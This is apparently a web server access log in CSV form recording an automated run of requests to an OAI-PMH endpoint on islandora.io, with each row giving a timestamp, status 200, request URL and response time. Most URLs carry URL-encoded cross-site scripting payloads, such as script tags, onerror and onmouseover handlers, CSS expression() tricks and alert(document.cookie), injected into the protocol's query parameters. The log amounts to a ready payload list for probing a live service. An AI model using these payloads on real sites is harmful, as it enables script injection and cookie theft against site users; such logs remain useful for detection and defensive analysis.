uuid,timestamp,http_status_code,request_url,response_time,http_version
bbadf36a-3284-4908-8f36-8310fbe60f12,2025-01-01 16:38:30,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2F%2F%2Fstyle%2F%2F%2F%3E%3Cspan+%252F+onmousemove%3D%27alert%26lpar%3B1%26rpar%3B%27%3ESPAN&metadataPrefix=oai_dc,40.94 ms,HTTP/1.1
6c48680e-6b89-4b4b-b22d-9ac7b5d3cd17,2025-01-01 16:38:30,200,http://islandora.io/oai/request?verb=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E,60.87 ms,HTTP/1.1
ee3321b9-d793-42cc-97a1-a01dbcb78f0f,2025-01-01 16:38:31,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E,63.80 ms,HTTP/1.1
70efbd69-1231-486a-90f5-152d3feed8a0,2025-01-01 16:38:31,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E,61.94 ms,HTTP/1.1
5fcdd5a4-d9ad-4e2e-9c65-bebd77a6a77c,2025-01-01 16:38:32,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&until=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E,89.34 ms,HTTP/1.1
fa8af4ee-e306-4a7a-a8b3-e9b4a0962254,2025-01-01 16:38:32,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&until=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&set=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E,71.28 ms,HTTP/1.1
5104e938-1ba2-4883-9861-58770a57286d,2025-01-01 16:38:32,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E&metadataPrefix=marc,42.80 ms,HTTP/1.1
2bc90854-f97e-4a5f-848f-f9665e0a1b68,2025-01-01 16:38:33,200,http://islandora.io/oai/request?verb=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,68.53 ms,HTTP/1.1
a0818707-75f3-4b74-ad00-8cdcc479a54f,2025-01-01 16:38:33,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,57.31 ms,HTTP/1.1
fcde2bcc-b523-4dfd-a09e-723b9b054edd,2025-01-01 16:38:33,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,60.66 ms,HTTP/1.1
26584e46-135c-4887-9de5-40d0d343527a,2025-01-01 16:38:34,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E&set=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,69.83 ms,HTTP/1.1
0bdcd5bd-3787-4477-adc2-15e1fc4f6096,2025-01-01 16:38:34,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E&until=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E,94.97 ms,HTTP/1.1
372346d9-2a85-47ca-b703-a794e4ba7dc5,2025-01-01 16:38:34,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2FXSS+STYLE%3Dxss%3Aexpression%28alert%28%27XSS%27%29%29%3E&metadataPrefix=marc,32.38 ms,HTTP/1.1
9ee5f021-099c-4905-9ddf-1eeda67e9e1d,2025-01-01 16:38:35,200,http://islandora.io/oai/request?verb=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E,61.31 ms,HTTP/1.1
2a687321-e705-47e1-8de1-1b048f8abfc3,2025-01-01 16:38:35,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.04 ms,HTTP/1.1
9837d2c9-adf7-49b1-8d21-31909daddfa8,2025-01-01 16:38:35,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E,62.26 ms,HTTP/1.1
e54aaa8c-fb3a-4b0d-b604-5ad19511b24e,2025-01-01 16:38:36,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E&set=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E,68.73 ms,HTTP/1.1
90a6d490-b17d-45ca-aca5-a441c5d7f34a,2025-01-01 16:38:36,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E,119.39 ms,HTTP/1.1
44e6c70b-0628-4d84-ba27-6d64920f5006,2025-01-01 16:38:36,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2FXSS%2F%2A-%2A%2FSTYLE%3Dxss%3Ae%2F%2A%2A%2Fxpression%28alert%28%27XSS%27%29%29%3E&metadataPrefix=oai_dc,54.68 ms,HTTP/1.1
13d00bc8-f3e3-40cd-93bb-301ba12fa700,2025-01-01 16:38:37,200,http://islandora.io/oai/request?verb=%3C%2Fbody%3E,47.74 ms,HTTP/1.1
1aacecd5-f7de-49a4-9dcc-3dda02e25d99,2025-01-01 16:38:37,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fbody%3E,81.89 ms,HTTP/1.1
b5c102b8-43a7-4994-b761-d46aa9c050c9,2025-01-01 16:38:37,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fbody%3E,65.82 ms,HTTP/1.1
177bdec4-6557-476b-98eb-398fbb6e4634,2025-01-01 16:38:38,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3C%2Fbody%3E,62.32 ms,HTTP/1.1
1325f4ba-1972-4b35-8908-4cdfc0eddc70,2025-01-01 16:38:38,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3C%2Fbody%3E,65.07 ms,HTTP/1.1
4598fa16-68cc-4497-ad6a-c20408e87dd8,2025-01-01 16:38:38,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fbody%3E&metadataPrefix=oai_dc,61.29 ms,HTTP/1.1
7f14b7a3-87e0-4ed9-96b1-7f049ee49681,2025-01-01 16:38:39,200,http://islandora.io/oai/request?verb=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E,59.03 ms,HTTP/1.1
3cfcbebc-8830-4cf6-bfdd-b98a6db29f3f,2025-01-01 16:38:39,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E,61.61 ms,HTTP/1.1
2be1ec99-6a03-43ae-83e8-6a094c6ea478,2025-01-01 16:38:39,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E,60.49 ms,HTTP/1.1
fda1f169-dd46-4548-a415-a10c4ffaccb7,2025-01-01 16:38:40,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E,45.18 ms,HTTP/1.1
85e00049-a915-4745-849d-003dafa19890,2025-01-01 16:38:40,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E,54.26 ms,HTTP/1.1
32fbefea-d234-4ca4-b9a7-b43084acd686,2025-01-01 16:38:41,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fbr+style%3Da%3Aexpression%28alert%28%29%29%3E&metadataPrefix=oai_dc,58.54 ms,HTTP/1.1
e403d9b5-a018-454f-9f23-be20b56ef004,2025-01-01 16:38:41,200,http://islandora.io/oai/request?verb=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E,37.55 ms,HTTP/1.1
9649d783-5b35-4d61-858f-73c75d4e2dc1,2025-01-01 16:38:41,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E,44.59 ms,HTTP/1.1
6abbad5a-f781-46be-ab8d-f03bbeba0cf1,2025-01-01 16:38:41,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E,46.88 ms,HTTP/1.1
21d8bc31-4672-45d3-bb71-689474960665,2025-01-01 16:38:42,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,72.01 ms,HTTP/1.1
453ea2d1-e919-48c1-af5b-8f87ce9d9bf4,2025-01-01 16:38:42,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E&until=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E&set=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E,74.36 ms,HTTP/1.1
477965e0-2254-4c55-8082-8a74330c6aa6,2025-01-01 16:38:43,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Ffont%3E%2F%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle%2Fonload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C%2Ffont%3E%2F%3C%2Fstyle%3E&metadataPrefix=marc,61.96 ms,HTTP/1.1
264e8f97-ee6e-4521-8464-bcbc1928630d,2025-01-01 16:38:43,200,http://islandora.io/oai/request?verb=%3C%2Fhtml%3E,65.78 ms,HTTP/1.1
d3bdfaad-6423-4182-9903-1fd5daf7904c,2025-01-01 16:38:43,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fhtml%3E,67.71 ms,HTTP/1.1
3735dbea-0cfd-4a13-b92c-8a5427e94dea,2025-01-01 16:38:44,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fhtml%3E,70.26 ms,HTTP/1.1
b74a9f0f-8606-4237-a56d-d8138576d4b1,2025-01-01 16:38:44,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3C%2Fhtml%3E,61.29 ms,HTTP/1.1
01e94ee5-d494-4f0c-8901-6cc6b305af11,2025-01-01 16:38:44,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%2Fhtml%3E&until=%3C%2Fhtml%3E,57.97 ms,HTTP/1.1
283503a1-5566-4da4-86a3-f598d88f9448,2025-01-01 16:38:45,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fhtml%3E&metadataPrefix=marc,32.10 ms,HTTP/1.1
1ce4587e-836c-4411-8a04-95d0af014749,2025-01-01 16:38:45,200,http://islandora.io/oai/request?verb=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29,82.28 ms,HTTP/1.1
40a1e72b-a251-489e-8a22-bd81368805e1,2025-01-01 16:38:45,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29,49.40 ms,HTTP/1.1
d7a714e7-e18f-496a-a6c4-d56bcc1544ea,2025-01-01 16:38:46,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29,61.89 ms,HTTP/1.1
56c6c421-057d-489c-bfa2-d59c356d76a8,2025-01-01 16:38:46,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29,68.72 ms,HTTP/1.1
7cec5b27-36d3-4a73-9f7c-d92ad1f8a41e,2025-01-01 16:38:46,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29&until=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29,66.85 ms,HTTP/1.1
7437ac36-4994-48cb-8b33-05d5c73e4ea9,2025-01-01 16:38:47,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fplaintext%5C%3E%3C%2F%7C%5C%3E%3Cplaintext%2Fonmouseover%3Dprompt%281%29&metadataPrefix=oai_dc,46.40 ms,HTTP/1.1
44cb8a54-fc88-4f66-8f7d-e55ee63a32f3,2025-01-01 16:38:47,200,http://islandora.io/oai/request?verb=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,69.93 ms,HTTP/1.1
0e7571a6-d532-4b25-ad76-2f984b5cf14e,2025-01-01 16:38:47,200,http://islandora.io/oai/request?verb=ListMetadataFormats,63.02 ms,HTTP/1.1
5ce3aa76-4eec-4df6-bebc-951b4689eb53,2025-01-01 16:38:48,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,67.70 ms,HTTP/1.1
75d3d50c-4176-4d81-815c-8ccb2f8e13f8,2025-01-01 16:38:48,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E&until=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E&set=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,54.36 ms,HTTP/1.1
549fbfa8-1bc2-48f7-b53a-bc9a27b9b8f6,2025-01-01 16:38:48,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,116.30 ms,HTTP/1.1
c1eb6300-ff09-4cc8-96a8-ab8621895dc0,2025-01-01 16:38:49,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E&metadataPrefix=oai_dc,62.20 ms,HTTP/1.1
911d6eae-b8c8-42ab-9f16-e28e56c4818b,2025-01-01 16:38:49,200,http://islandora.io/oai/request?verb=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,58.66 ms,HTTP/1.1
e38f60da-876e-43c7-960d-e44738b1e65e,2025-01-01 16:38:49,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,53.95 ms,HTTP/1.1
72d0e68b-ce74-4d12-bf5b-11f0b25741ab,2025-01-01 16:38:50,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,89.00 ms,HTTP/1.1
d2774fbf-9f15-4649-8aa6-443c9499cb9d,2025-01-01 16:38:50,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,68.39 ms,HTTP/1.1
2adc92b8-996f-43c6-8a46-4787c6170cb4,2025-01-01 16:38:51,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E,120.93 ms,HTTP/1.1
a1791a44-c9e5-4388-9d13-13bd48eff1d6,2025-01-01 16:38:51,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscript%3E%3C%2Fscript%3E%3C%3C%3C%3Cscript%3E%3C%3E%3E%3E%3E%3C%3C%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&metadataPrefix=marc,56.04 ms,HTTP/1.1
b7e4c287-8c58-4960-a41a-d601716a0508,2025-01-01 16:38:51,200,http://islandora.io/oai/request?verb=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E,46.06 ms,HTTP/1.1
529977e2-cabd-43f5-abdf-b21730451151,2025-01-01 16:38:52,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E,60.32 ms,HTTP/1.1
3acac19c-1a72-4e5f-a2ee-1868afd699eb,2025-01-01 16:38:52,200,http://islandora.io/oai/request?verb=ListSets,67.81 ms,HTTP/1.1
d76c3f3e-ec0f-4eb8-ba57-d9be0bdbc428,2025-01-01 16:38:52,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E&set=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E,57.32 ms,HTTP/1.1
e0627141-b173-493e-bb97-69d4a28f4fef,2025-01-01 16:38:53,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E&until=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E,62.79 ms,HTTP/1.1
624b6f62-b3e3-42ff-bc2c-805296bdd87e,2025-01-01 16:38:53,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscript%3E%3Cimg%2F%2A%2500%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2500%2A%2Fonerror%3D%27eval%28src%29%27%3E&metadataPrefix=marc,87.15 ms,HTTP/1.1
24422495-6f6e-4fca-8883-dfa79e33d2ef,2025-01-01 16:38:53,200,http://islandora.io/oai/request?verb=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E,66.44 ms,HTTP/1.1
75e7f6d5-bbb0-427e-a936-840f3debe8af,2025-01-01 16:38:54,200,http://islandora.io/oai/request?verb=ListMetadataFormats,47.05 ms,HTTP/1.1
d9035406-df29-444d-b1c1-a7c2aee1cbf2,2025-01-01 16:38:54,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E,69.03 ms,HTTP/1.1
709ac699-cfb6-4bac-ae2a-33b37f0d3b5c,2025-01-01 16:38:54,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E&until=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E,72.60 ms,HTTP/1.1
0053d2c7-8bd8-413d-8370-cdffa0a245a7,2025-01-01 16:38:55,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E&until=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E&set=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E,48.54 ms,HTTP/1.1
5517c71e-4f48-4857-afa8-fc6cc4ab30ce,2025-01-01 16:38:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscript%3E%3Cimg%2F%2A%2Fsrc%3D%22worksinchrome%26colon%3Bprompt%26%23x28%3B1%26%23x29%3B%22%2F%2A%2Fonerror%3D%27eval%28src%29%27%3E&metadataPrefix=oai_dc,61.92 ms,HTTP/1.1
33d09267-aaf8-46cd-bdca-66ac49ccb072,2025-01-01 16:38:55,200,http://islandora.io/oai/request?verb=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E,83.22 ms,HTTP/1.1
1156be3e-d6c6-465a-932f-e16a9bb3d884,2025-01-01 16:38:56,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E,69.02 ms,HTTP/1.1
d2cb32ef-bc93-4f33-8187-dfc831c96f5f,2025-01-01 16:38:56,200,http://islandora.io/oai/request?verb=ListSets,29.57 ms,HTTP/1.1
a18c520a-d595-4403-b0f5-35cdc7af7c66,2025-01-01 16:38:56,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E&set=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E,62.34 ms,HTTP/1.1
abbaa1f3-6c04-492d-b49e-6e4bcdb72fcc,2025-01-01 16:38:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E,85.45 ms,HTTP/1.1
9de13d12-beea-4f31-8450-f4b592eeff34,2025-01-01 16:38:57,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscript%3E%3Cscript+%3Ealert%28document.cookie%29%3C%2Fscript%3E&metadataPrefix=marc,59.35 ms,HTTP/1.1
1e5cffa3-e044-43d5-bb25-558df9238c7b,2025-01-01 16:38:57,200,http://islandora.io/oai/request?verb=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E,57.17 ms,HTTP/1.1
23c95150-5c0b-4b29-b9c7-ff55153867a1,2025-01-01 16:38:58,200,http://islandora.io/oai/request?verb=ListMetadataFormats,47.84 ms,HTTP/1.1
0cf9e4dc-3a2a-45ce-b283-4911e9734dc1,2025-01-01 16:38:58,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E,61.31 ms,HTTP/1.1
cc7a71a8-eb7d-43aa-bd73-ca0cb8e684c1,2025-01-01 16:38:58,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&set=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E,66.58 ms,HTTP/1.1
732aa775-2fda-4a76-b6ae-10c21ab2334b,2025-01-01 16:38:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E,96.89 ms,HTTP/1.1
ce3a0763-9a1a-4bf7-903c-07b427bb576a,2025-01-01 16:38:59,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E&metadataPrefix=marc,53.20 ms,HTTP/1.1
